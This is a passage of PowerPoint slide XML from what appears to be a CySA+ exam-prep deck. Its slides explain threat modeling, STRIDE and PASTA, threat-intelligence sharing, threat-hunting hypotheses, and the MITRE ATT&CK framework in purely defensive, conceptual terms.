<file path=ppt/slides/slide2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THREAT RESEARCH</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Threat Research (5)</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CVSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Common Vulnerability Scoring System (CVSS)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239</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT MODELING AND INTELLIGENCE SHARING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Threat Modeling Methodologies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Threat modeling is a structured process for identifying, quantifying, and prioritizing the threats to a system before or during its design, so defenses can be built against realistic attacks rather than assumptions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It weighs factors such as adversary capability (how skilled and resourced the attacker is), the total attack surface, the specific attack vectors available, the potential impact of a successful compromise, and the likelihood of that attack occurring.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because scoring threats by likelihood and impact lets the SOC and engineering teams focus limited resources on the risks that matter most and design controls where the attack surface is genuinely exposed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests the core variables of threat modeling — adversary capability, attack surface, attack vector, likelihood, and impact — and how they combine to prioritize risk.</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240</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT MODELING AND INTELLIGENCE SHARING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Threat Modeling Methodologies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Adversary capability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Total attack surface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Attack vector</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Impact</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Likelihood</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241</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT MODELING AND INTELLIGENCE SHARING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Microsoft STRIDE Threat Categories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STRIDE is a Microsoft threat-modeling framework that classifies threats into six categories: Spoofing (impersonating a user or system), Tampering (unauthorized modification of data), Repudiation (denying an action without a way to prove otherwise), Information Disclosure (exposing data to unauthorized parties), Denial of Service (making a system unavailable), and Elevation of Privilege (gaining rights beyond those granted).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Each category maps directly to a desirable security property it violates — spoofing breaks authentication, tampering breaks integrity, repudiation breaks non-repudiation, information disclosure breaks confidentiality, denial of service breaks availability, and elevation of privilege breaks authorization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because STRIDE gives a repeatable checklist to systematically enumerate what could go wrong with each component of a system, ensuring no major threat class is overlooked during design review.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to recall each STRIDE letter, the threat it represents, and the security property it violates (e.g., Spoofing/authentication, Elevation of Privilege/authorization).</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242</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT MODELING AND INTELLIGENCE SHARING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Microsoft STRIDE Threat Categories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g_cc090f9e62.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1089276" y="1783080"/>
            <a:ext cx="10010400" cy="4434840"/>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243</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT MODELING AND INTELLIGENCE SHARING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PASTA Stages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PASTA (Process for Attack Simulation and Threat Analysis) is a risk-centric, seven-stage threat-modeling methodology that ties technical threats back to business impact and objectives.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its seven stages are: define objectives, define the technical scope, decompose the application, analyze threats, analyze vulnerabilities and weaknesses, analyze attacks (including attack modeling and simulation), and analyze risk and impact to drive countermeasures.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because PASTA's business-driven, attacker-simulating approach produces threat models that speak to management in terms of risk to objectives, making it easier to justify and prioritize security investments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam identifies PASTA as a seven-stage, risk- and business-centric attacker-simulation methodology and may contrast it with STRIDE's category-based approach.</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244</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT MODELING AND INTELLIGENCE SHARING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PASTA Stages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g_11dffb3529.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1482885" y="1783080"/>
            <a:ext cx="9223181" cy="4434840"/>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245</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT MODELING AND INTELLIGENCE SHARING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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Threat Intelligence Sharing with Supported Functions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This concept describes how finished threat intelligence is distributed to and consumed by the specific security functions it supports, ensuring the right teams receive intelligence tailored to their needs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Incident response uses shared intelligence to identify and contain active threats faster, vulnerability management uses it to prioritize which flaws attackers are actually exploiting, risk management uses it to inform business risk decisions, security engineering uses it to harden and design controls, and detection and monitoring uses it to write and tune detection signatures and alerts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because intelligence only creates value when it reaches the function that can act on it, so understanding these consumers ensures dissemination is targeted rather than wasted on teams that cannot use it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: CySA+ asks you to map threat intelligence to the functions it supports — incident response, vulnerability management, risk management, security engineering, and detection and monitoring.</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246</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT MODELING AND INTELLIGENCE SHARING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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Threat Intelligence Sharing with Supported Functions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Incident response</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerability management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Risk management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security engineering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Detection and monitoring</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247</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT HUNTING AND THE HYPOTHESIS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Threat Hunting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Threat hunting is the proactive, hypothesis-driven practice of searching an environment for threats that have evaded existing automated detections, rather than waiting for an alert to fire.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It requires organizational funding and support to succeed, and typically begins with an initiation phase followed by the creation of a hypothesis — an educated, intelligence-informed assumption about how an adversary might already be present, such as 'an attacker is using PowerShell for lateral movement.'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because sophisticated adversaries deliberately avoid signature-based tools, and hunting assumes a breach has already occurred, actively looking for the evidence so dwell time is reduced and detection gaps are turned into new automated rules.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam frames threat hunting as proactive and hypothesis-driven (assuming compromise), and tests that it begins with forming a hypothesis, distinct from reactive alert-based monitoring.</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248</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT HUNTING AND THE HYPOTHESIS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Threat Hunting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Proactively searching environment for threats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249</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT HUNTING AND THE HYPOTHESIS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Threat Hunting Process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The threat hunting process begins with a planning phase that scopes the hunt by answering a set of guiding questions before any data is examined.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Those questions establish the purpose of the hunt, where in the environment it will be conducted, what resources and data sources are needed, who the key stakeholders are, and what the desired outcome is — for example confirming or ruling out a specific adversary behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because a well-scoped hunt stays focused and measurable, produces repeatable results, and yields concrete outputs such as new detection rules, closed visibility gaps, and lessons that feed the next hunt.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on the planning questions that scope a hunt — purpose, location, resources, stakeholders, and desired outcome — as the foundation of a structured hunting engagement.</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250</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT HUNTING AND THE HYPOTHESIS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Threat Hunting Process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What is the purpose of the hunt?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Where will it be conducted?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  What resources do I need to conduct the hunt?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Who are the key stakeholders?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  What is the desired outcome of the hunt?</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251</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT HUNTING AND THE HYPOTHESIS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Threat Hunting Process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g_aa80adb260.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2160344" y="1783080"/>
            <a:ext cx="7868264" cy="4434840"/>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252</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT HUNTING AND THE HYPOTHESIS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Threat Hunting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Funding and support</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Initiation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Creation of the hypothesis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253</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT HUNTING AND THE HYPOTHESIS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Establishing a Hypothesis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A threat-hunting hypothesis is a testable statement of expectation about how an adversary might already be operating inside your environment, phrased so that hunting through data can either confirm or refute it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Hypotheses are commonly categorized by what drives them: analytics-driven (built from data, machine learning, and behavioral baselines), intelligence-driven (someone has provided threat intelligence such as IOCs or a TTP report), situational-driven (a change in the environment, like a new deployment, creates fresh vulnerabilities to probe), and experience-driven (grounded in an analyst's deep familiarity with the specific network).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A strong hypothesis is narrow and evidence-based rather than a vague fear, so it points the hunt at specific data sources and expected artifacts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because a well-formed hypothesis focuses limited hunting time on plausible, high-value threats instead of aimless log browsing, and it produces a repeatable, documentable process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect a scenario that describes what prompted a hunt (a new intel feed, a network change, a strange metric) and asks you to identify which type of hypothesis it represents.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254</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT HUNTING AND THE HYPOTHESIS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Establishing a Hypothesis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Statement of expectation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Based on information</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analytics-driven</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Based on data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Situational-driven</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Situations change, resulting in vulnerabilities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255</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT HUNTING AND THE HYPOTHESIS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Establishing a Hypothesis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Intelligence-driven</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Someone has provided intelligence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Experience-driven</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Based on familiarity with your environment</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256</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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PROFILING THREAT ACTORS AND ACTIVITIES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MITRE ATT&amp;CK framework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MITRE ATT&amp;CK is a globally maintained, freely available knowledge base of adversary behavior organized as a matrix of tactics (the attacker's goals) and the techniques and sub-techniques used to achieve each goal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its enterprise tactics run roughly in the order an intrusion unfolds: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, and Impact.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Each technique carries a unique ID (for example T1566 Phishing), detection guidance, and mitigations, which lets teams map real observed activity to a common vocabulary.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts use ATT&amp;CK to build detections, drive threat hunts, measure coverage gaps, and communicate about attacker behavior in a shared, tool-agnostic language.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
